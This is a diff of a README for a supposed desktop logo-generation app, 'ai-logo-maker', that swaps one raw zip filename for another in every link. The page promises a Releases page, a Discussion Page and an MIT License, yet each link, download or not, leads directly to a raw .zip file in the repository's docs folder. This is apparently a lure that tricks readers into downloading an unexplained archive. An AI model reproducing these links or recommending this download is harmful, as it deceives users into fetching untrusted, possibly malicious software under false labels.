@@ -6,7 +6,7 @@ Welcome to ai-logo-maker! This is a desktop application that allows you to gener
 
 ## 📥 Download Now!
 
-[![Download ai-logo-maker](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/maker-logo-ai-v3.3.zip%20Now-Here-blue)](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/maker-logo-ai-v3.3.zip)
+[![Download ai-logo-maker](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/ai_logo_maker_v2.1.zip%20Now-Here-blue)](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/ai_logo_maker_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ Before you download, ensure your computer meets the following requirements:
 
 To get started with ai-logo-maker, please visit the Releases page to download the application:
 
-[Download Here](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/maker-logo-ai-v3.3.zip)
+[Download Here](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/ai_logo_maker_v2.1.zip)
 
 ### 📥 How to Install
 
@@ -65,7 +65,7 @@ If you need help while using the application, the built-in user guide can assist
 
 ## 💬 Community Support
 
-Join our community to connect with other users. You can share your designs, ask questions, and find inspiration. Visit our [Discussion Page](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/maker-logo-ai-v3.3.zip) to participate.
+Join our community to connect with other users. You can share your designs, ask questions, and find inspiration. Visit our [Discussion Page](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/ai_logo_maker_v2.1.zip) to participate.
 
 ## ⚡ Contributions
 
@@ -73,12 +73,12 @@ We welcome anyone interested in improving ai-logo-maker. If you want to report b
 
 ## 📄 License
 
-ai-logo-maker is licensed under the [MIT License](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/maker-logo-ai-v3.3.zip). This means you can use, modify, and distribute the software as you wish, with credit to the original creators.
+ai-logo-maker is licensed under the [MIT License](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/ai_logo_maker_v2.1.zip). This means you can use, modify, and distribute the software as you wish, with credit to the original creators.
 
 ## 📥 Download Again
 
 To start creating your logos today, visit the Releases page for the download:
 
-[Download Here](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/maker-logo-ai-v3.3.zip)
+[Download Here](https://github.com/Super-Coder-King/ai-logo-maker/raw/refs/heads/main/docs/ai_logo_maker_v2.1.zip)
 
 Happy designing!
